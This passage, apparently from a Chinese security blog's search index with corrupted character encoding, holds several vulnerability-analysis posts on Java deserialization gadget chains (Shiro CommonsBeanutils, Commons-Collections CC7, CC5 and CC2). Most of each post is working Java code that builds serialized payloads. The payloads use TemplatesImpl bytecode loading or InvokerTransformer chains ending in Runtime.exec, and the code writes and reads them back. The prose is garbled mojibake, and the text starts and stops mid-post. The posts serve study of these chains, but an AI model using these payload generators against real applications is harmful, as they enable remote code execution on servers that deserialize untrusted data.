æ­¤æˆ‘ä»¬å°±è¦ä»TemplatesImplç±»ä¸­æ‰¾ä¸€ä¸‹èƒ½å‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œå®é™…ä¸Šè¿™é‡Œç”¨çš„å°±æ˜¯CBä¸­çš„PropertyUtils.getPropertyæ–¹æ³•ï¼Œå®ƒèƒ½å¤Ÿè·å–ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ä¸­çš„JavaBeanæ ¼å¼çš„æ–¹æ³•ï¼Œè€ŒTemplatesImplç±»ä¸­æ°å¥½æœ‰ç¬¦åˆJavaBeanæ ¼å¼ï¼Œä¸”èƒ½å¤Ÿåˆ©ç”¨çš„æ–¹æ³•ï¼š è€ŒPropertyUtilsç±»æ˜¯æ²¡æœ‰ç»§æ‰¿åºåˆ—åŒ–æ¥å£çš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨CBä¾èµ–ä¸­æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨PropertyUtils.getPropertyæ–¹æ³•çš„ç±»ä¸”ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨BeanComparatorç±»ï¼Œå…¶ä¸­æœ‰ç€compareæ–¹æ³•ï¼š è¿™éƒ¨åˆ†çš„é“¾å­åº”è¯¥è¿™æ ·å†™ï¼š 1BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); è‡³äºä¸ºä»€ä¹ˆè¦ä¼ AttrCompareç±»çš„å®ä¾‹ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹BeanComparatoræ„é€ å™¨çš„æºç ï¼š å…¶ä¸­çš„ComparableComparatorç±»æ¥è‡ªäºCCä¾èµ–ï¼Œåœ¨shiroåŸç”Ÿä¸­æ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç”¨äº†ä¸€ä¸ªå³åœ¨CBä¾èµ–ä¸­æœ‰ï¼Œåˆç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£çš„ç±»ã€‚ æ¥ä¸‹æ¥å¯»æ‰¾è°ƒç”¨compareæ–¹æ³•çš„ç±»ï¼Œæ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰äº†ï¼Ÿ æ²¡é”™ï¼Œåœ¨ä¹‹å‰çš„CC4é“¾çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å°±ç”¨äº†compareæ–¹æ³•æ¥è§¦å‘ChainedTransformerçš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å»å†çœ‹ä¸€çœ‹é‚£ä¸ªcompareæ–¹æ³•ï¼š å¯è§å…¶ä¸ä»…è°ƒç”¨äº†transformæ–¹æ³•ï¼Œè¿˜è°ƒç”¨äº†compareæ–¹æ³•ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠdecoratedä¼ æˆæˆ‘ä»¬æ„é€ å¥½çš„BeanComparatorç±»çš„å®ä¾‹å°±å¥½äº†ï¼Œåªéœ€è¦æŠŠCC4ä¸­ä¼ å…¥priorityQueueçš„transformingComparatoræ”¹æˆbeanComparatorå°±å¥½äº†ï¼Œæ¥ä¸‹æ¥çš„æµç¨‹å°±å’ŒCC4åè¾¹ä¸€æ ·äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿è¿‡æ¥ï¼š 12345678910111213141516171819202122232425TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare());TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(2);Class&lt;PriorityQueue&gt; c = PriorityQueue.class;Field comparatorField = c.getDeclaredField(&quot;comparator&quot;);comparatorField.setAccessible(true);comparatorField.set(priorityQueue,beanComparator);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;));oos.writeObject(priorityQueue); æœ€åæ‰“ä¸€ä¸‹çœ‹çœ‹ï¼š æˆåŠŸæ‰§è¡Œ","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC7é“¾","slug":"JAVAå®‰å…¨CC7é“¾","date":"2024-03-19T13:39:27.499Z","updated":"2024-08-24T03:27:00.236Z","comments":true,"path":"2024/03/19/JAVAå®‰å…¨CC7é“¾/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;20 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;20 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€ä½œä¸ºCCé“¾ç³»åˆ—çš„æœ€åä¸€æ¡ï¼Œå½“ç„¶è¦æ”¾åˆ°æœ€åå­¦å•¦ æ­£æ–‡æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ysoserialä¸­çš„CC7é“¾æµç¨‹ï¼š è¿™é‡Œæ˜¯åœ¨LazyMapçš„getæ–¹æ³•ä¹‹å‰å‘ç”Ÿäº†å˜åŒ–ï¼Œæˆ‘ä»¬è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„æ€è·¯ï¼Œä¸€ç‚¹ç‚¹åˆ†æ 1.AbstractMapéƒ¨åˆ†ä»è°ƒç”¨getæ–¹æ³•çš„ç±»é‡Œè¾¹æ‰¾ï¼Œæ‰¾åˆ°äº†AbstractMapç±»ï¼Œå®ƒçš„equalsæ–¹æ³•è°ƒç”¨äº†getæ–¹æ³•ï¼š må¯¹è±¡æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼Œå¯æ§ï¼Œæˆ‘ä»¬ç»§ç»­å‘ä¸Šæ‰¾ 2.AbstractMapDecoratoréƒ¨åˆ† å‘ç°AbstractMapDecoratorç±»çš„equalsæ–¹æ³•è°ƒç”¨äº†equalsæ–¹æ³•ï¼Œä¸”å…¶æ„é€ å™¨å¦‚ä¸‹ï¼š mapå‚æ•°å¯æ§ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸Šæ‰¾ 3.HashTableéƒ¨åˆ† HashTableç±»çš„reconstitutionPutæ–¹æ³•å¯¹equalsæ–¹æ³•è¿›è¡Œäº†è°ƒç”¨ï¼Œçœ‹èµ·æ¥æµç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹å¢åŠ çš„keyè¿›è¡Œhashè®¡ç®—ï¼Œå¦‚æœhashå€¼ä¸tabä¸­çš„æ‰€æœ‰å…ƒç´ å‡ä¸åŒï¼Œå°±ä¼šå¢åŠ åˆ°æ•°ç»„tabä¸­ï¼Œå¦åˆ™å°±ä¼šæŠ¥å¼‚å¸¸ æˆ‘ä»¬å†çœ‹çœ‹è°ƒç”¨è¯¥æ–¹æ³•çš„éƒ¨åˆ†ï¼š HashTableç±»ä¸­çš„readObjectæ–¹æ³•ï¼Œçœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¤§åŠŸå‘Šæˆäº†ï¼ŒHashTableç±»å®Œå…¨å¯ä»¥ä½œä¸ºé“¾å­çš„ç»“å°¾ã€‚æˆ‘ä»¬æ¥æ„é€ é“¾å­ 4.æ„é€ é“¾é¦–å…ˆï¼ŒLazyMapä¹‹å‰çš„éƒ¨åˆ†ç”±äºå’ŒCC1é“¾ç›¸åŒï¼Œæˆ‘ä»¬å°±ç›´æ¥copyè¿‡æ¥ï¼š 1234567Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); æ¥ä¸‹æ¥æˆ‘ä»¬æŒ‰ç…§é“¾å­è§¦å‘çš„é¡ºåºæ¥å†™é“¾å­ 4.1 HashTableéƒ¨åˆ†HashTableçš„readObjectæ–¹æ³•ä¼šç›´æ¥ç”¨reconstitutionPutæ–¹æ³•æ¥è¯»å–åºåˆ—åŒ–æ•°æ®ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨reconstitutionPutæ–¹æ³•è§¦å‘å…¶ä¸­çš„equalsæ–¹æ³•ï¼Œå°±éœ€è¦è¿›å…¥å…¶forå¾ªç¯çš„ifåˆ¤æ–­ï¼Œè€Œä¸”éœ€è¦ifåˆ¤æ–­çš„ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼ˆäºŒè€…hashå€¼ç›¸åŒï¼‰é€šè¿‡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡³å°‘ä¼ å…¥ä¸¤ä¸ªhashå€¼ç›¸åŒçš„LazyMapï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ§åˆ¶LazyMapçš„keyå’Œvalueå€¼ï¼Œç½‘ä¸Škeyçš„hashç›¸åŒçš„æœ‰yyå’ŒzZæˆ–AaAaAaå’ŒBBAaBBç­‰ï¼Œæˆ‘ä»¬éšä¾¿é€‰ä¸€ç»„ä½œä¸ºä¸¤ä¸ªLazyMapçš„keyå€¼å³å¯ è¿™é‡Œè°ƒç”¨çš„e.key.equals(key)è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹ï¼ŒeæŒ‡çš„æ˜¯æ•°ç»„tabï¼Œe.keyçš„keyæŒ‡çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªLazyMapï¼Œequals(key)ä¸­çš„keyæŒ‡çš„æ˜¯ä¼ å…¥çš„ç¬¬äºŒä¸ªLazyMapï¼Œæˆ‘ä»¬å°±æ˜¯è¦ç”¨ç¬¬äºŒä¸ªLazyMapè§¦å‘å‘½ä»¤æ‰§è¡Œ 4.2 AbstractMapDecoratoréƒ¨åˆ†ç”±äºLazyMapæ²¡æœ‰equalsæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨LazyMapçš„çˆ¶ç±»AbstractMapDecoratorä¸­çš„equalsæ–¹æ³• ï¼ˆè¿™é‡Œå…¶å®å°±æ˜¯æŠŠä¸Šè¾¹çš„å›¾å¤åˆ¶ä¸‹æ¥äº†ï¼Œå› ä¸ºæµç¨‹æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åè¿‡æ¥äº†ï¼‰ è¿™é‡Œæˆ‘ä»¬ä¼ å…¥äº†LazyMapï¼Œå…¶this.mapæŒ‡çš„æ˜¯LazyMapä¸­ä¼ å…¥çš„HashMapï¼Œçœ‹ä¸æ‡‚çš„è¯å¯ä»¥è°ƒè¯•ä¸€ä¸‹ ä¹‹åè§¦å‘HashMapçš„equalsæ–¹æ³• 4.3AbstractMapéƒ¨åˆ†HashMapä¹Ÿæ²¡æœ‰equalsæ–¹æ³•ï¼Œå› æ­¤ä¹Ÿä¼šè°ƒç”¨å…¶çˆ¶ç±»çš„equalsæ–¹æ³• è¿™æ—¶é‡Œè¾¹ä¼ å…¥çš„oå¯¹è±¡å…¶å®è¿˜æ˜¯æˆ‘ä»¬åˆšå¼€å§‹ä¼ å…¥çš„ç¬¬äºŒä¸ªLazyMapå¯¹è±¡ï¼Œç»è¿‡ä¸Šè¾¹çš„ä¸€ç³»åˆ—åˆ¤æ–­ä¾¿å¯è°ƒç”¨LazyMapçš„getæ–¹æ³•ï¼Œä¹‹åä¾¿ä¼šè§¦å‘å¦‚åŒCC1é“¾ä¸€æ ·çš„æµç¨‹è€Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ 4.4 é“¾å­å±•ç¤º123456789101112131415161718192021222324252627Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);HashMap&lt;Object,Object&gt; innerMap1 = new HashMap&lt;&gt;();HashMap&lt;Object,Object&gt; innerMap2 = new HashMap&lt;&gt;();Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);lazyMap1.put(&quot;yy&quot;,1);lazyMap2.put(&quot;zZ&quot;,1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);Class c = chainedTransformer.getClass();Field iTransformersField = c.getDeclaredField(&quot;iTransformers&quot;);iTransformersField.setAccessible(true);iTransformersField.set(chainedTransformer, transformers);lazyMap2.remove(&quot;yy&quot;);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));oos.writeObject(hashtable);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC5é“¾","slug":"JAVAå®‰å…¨CC5é“¾","date":"2024-03-19T13:38:03.242Z","updated":"2024-03-25T12:30:56.368Z","comments":true,"path":"2024/03/19/JAVAå®‰å…¨CC5é“¾/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€CC5çš„é™åˆ¶æ¯”è¾ƒå¤šï¼Œå¯¹äºjdkç‰ˆæœ¬ä»¥åŠå¿…é¡»WITHOUT a security manager å®é™…ä¸Šè¿™ä¸ªCC5é“¾å’ŒCC1å¾ˆåƒå•Šï¼Œåªæ˜¯æ”¹å˜äº†LazyMapçš„getæ–¹æ³•çš„è§¦å‘æ–¹å¼ï¼Œä¸ºäº†è®°å½•å­¦ä¹ è¿‡ç¨‹ï¼Œè¿˜æ˜¯å†™ä¸‹æ¥å§ã€‚ æ­£æ–‡å…ˆçœ‹ä¸€ä¸‹ysoserialçš„CC5æµç¨‹ï¼š ç”±äºå’ŒCC1é“¾å¾ˆåƒï¼Œæˆ‘ä»¬å°±å…ˆæŠŠCC1å¤åˆ¶è¿‡æ¥çœ‹çœ‹ï¼š 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//åå°„è·å–AnnotationInvocationHandlerç±»Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); æˆ‘ä»¬éœ€è¦æ”¹çš„å°±æ˜¯LazyMapçš„åè¾¹ï¼Œå…ˆçœ‹çœ‹è°ƒç”¨getæ–¹æ³•çš„ç±»å§ 1.TiedMapEntryéƒ¨åˆ† å¯è§TiedMapEntryçš„getValueæ–¹æ³•è°ƒç”¨äº†getæ–¹æ³•ï¼Œå¯ä½œä¸ºä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸Šæ‰¾ï¼š å¯è§å…¶toStringæ–¹æ³•è°ƒç”¨äº†getValueæ–¹æ³•ï¼Œæˆ‘ä»¬å†å¾€ä¸Šæ‰¾ 2.BadAttributeValueExpExceptionéƒ¨åˆ† å¯è§BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•è°ƒç”¨äº†toStringæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥åªéœ€è¦è®©valObjæ˜¯æˆ‘ä»¬ä¼ å…¥çš„TiedMapEntryå®ä¾‹å°±è¡Œäº†ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹valObjæ€ä¹ˆæ¥çš„ï¼š 12ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get(&quot;val&quot;, null); è¯´ç™½äº†ï¼ŒvalObjçš„å€¼å°±æ˜¯ä»è¾“å…¥æµoisä¸­è¯»å–çš„å¯¹è±¡çš„â€valâ€å­—æ®µçš„å€¼ã€‚å¦‚æœè¯¥å­—æ®µä¸å­˜åœ¨æˆ–è€…å€¼ä¸ºnullï¼ŒvalObjçš„å€¼å°±ä¼šæ˜¯nullã€‚ é‚£ä¹ˆæ€ä¹ˆæ§åˆ¶valå‘¢ï¼Ÿå¦‚æœç›´æ¥åœ¨æ„é€ å™¨ä¸­è°ƒç”¨çš„è¯ï¼Œé‚£ä¹ˆåœ¨æ„é€ çš„æ—¶å€™å°±ä¼šç›´æ¥è§¦å‘è¿™æ¡é“¾å­ï¼Œå¾ˆç®€å•ï¼Œç”¨åå°„ä¸å°±æ˜¯äº† 12345BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry); 3.æ„é€ é“¾æŠŠä¸Šè¾¹çš„ç›´æ¥æ”¹åˆ°CC1é“¾å­é‡Œå°±è¡Œäº†ï¼š 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//åå°„TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(badAttributeValueExpException);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); CC5å°±å®Œæˆäº†ã€‚","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC2é“¾","slug":"JAVAå®‰å…¨CC2é“¾","date":"2024-03-19T09:53:13.362Z","updated":"2024-06-17T09:01:45.460Z","comments":true,"path":"2024/03/19/JAVAå®‰å…¨CC2é“¾/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC2%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€CC2è¿™æ¡é“¾å’ŒCC4å¾ˆåƒï¼Œåªæ˜¯æ”¹å˜äº†åŸå…ˆçš„ChainedTransformerçš„åœ°æ–¹ã€‚CC2ä½œä¸ºCCé“¾ä¸­å”¯ä¸€ä¸ç”¨æ•°ç»„çš„é“¾å­ï¼Œå…¶ä½œç”¨å¬ç™½æ—¥æ¢¦ç»„é•¿è¯´æ˜¯ä¸ºäº†é˜²æ­¢æŸäº›ä¸­é—´ä»¶é‡å†™ç±»åŠ è½½çš„æµç¨‹ï¼Œå¯¼è‡´æ•°ç»„å¯èƒ½ä¼šåŠ è½½ä¸åˆ°ã€‚åŒæ—¶ï¼ŒCC1é“¾åœ¨jdk8u71ä»¥ä¸Šçš„ç‰ˆæœ¬å› ä¸ºAnnotationInvocationHandlerç±»çš„readObjectæ–¹æ³•è¢«ä¿®å¤äº† æ­£æ–‡emmmâ€¦ æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸‹ysoserialä¸­çš„CC2æµç¨‹ï¼š åŸºæœ¬ä¸Šæ˜¯å’ŒCC4æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ”¹ChainedTransformerå°±å¥½äº†ï¼š 1.InvokerTransformeréƒ¨åˆ†å…ˆæŠŠCC4è´´å‡ºæ¥ï¼š 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); å°†CC4ä¸­çš„ï¼š 1234Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;; æ”¹æˆï¼š 1InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;); ç›¸å½“äºç»•è¿‡äº†TrAXFilterå’ŒInstantiateTransformerï¼Œå°†å…¶æ›¿æ¢æˆäº†InvokerTransformerï¼Œè¿›ä¸€æ­¥åœ°æ²Ÿé€šäº†TransformingComparatorå’Œ TemplatesImpl 2.ä¼ å…¥templatesç›®å‰æˆ‘ä»¬çš„é“¾å­æ˜¯è¿™æ ·çš„ï¼š 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); å› ä¸ºChainedTransformerè¢«æ›¿æ¢æ‰äº†ï¼Œå…¶ä¸­çš„ConstantTransformerè‡ªç„¶ä¹Ÿæ˜¯æ²¡äº†ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¼ å‚äº†ï¼Œå…ˆè¿è¡Œä¸€ä¸‹çœ‹çœ‹å“ªé‡ŒæŠ¥é”™ï¼Œæˆ‘ä»¬è¿›å»è°ƒè¯•æŸ¥çœ‹éœ€è¦ä¼ å‚çš„åœ°æ–¹å³å¯ï¼š æŠ¥é”™æ•´æ•°ç±»å‹çš„å¯¹è±¡æ²¡æœ‰newTransformeræ–¹æ³•ï¼Œå†çœ‹çœ‹æˆ‘ä»¬çš„é“¾å­ï¼Œæ˜¯ä¸æ˜¯çªç„¶æ˜ç™½è¯¥æ”¹å“ªé‡Œäº†å‘¢ï¼Ÿ æˆ‘ä»¬å°†addçš„å†…å®¹æ”¹ä¸ºtemplateså³å¯ï¼š 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(templates);Class c = 